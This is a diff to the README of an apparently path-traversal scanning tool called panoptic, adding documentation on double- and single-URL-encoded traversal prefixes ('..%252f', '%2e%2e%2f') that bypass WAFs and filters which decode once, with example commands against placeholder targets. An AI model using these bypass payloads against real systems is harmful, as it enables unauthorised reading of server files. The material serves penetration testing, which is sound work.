@@ -154,6 +154,28 @@ panoptic --url "http://target/filtered.php?file=test.txt" \
   --prefix "....//....//....//....//"
 ```
 
+### Encoded traversal (WAF / single-decode bypass)
+
+Prefixes are sent exactly as given, so encoded traversal sequences reach
+the target unchanged. For example, in `..%252f` the dots are literal and
+only the slash is double-encoded: the first decode turns `%252f` into
+`%2f`, so a filter that decodes once sees no `../`, and a second decode
+by the application turns it into `/`:
+
+```bash
+panoptic --url "http://target/files/view/test.txt" --path-based \
+  --prefix "..%252f" --multiplier 6
+```
+
+A singly encoded prefix such as `%2e%2e%2f` becomes `../` after one
+decode. It only helps against filters that inspect the raw, undecoded
+request:
+
+```bash
+panoptic --url "http://target/include.php?file=test.txt" \
+  --prefix "%2e%2e%2f" --multiplier 6
+```
+
 ### Filtered scans
 
 ```bash
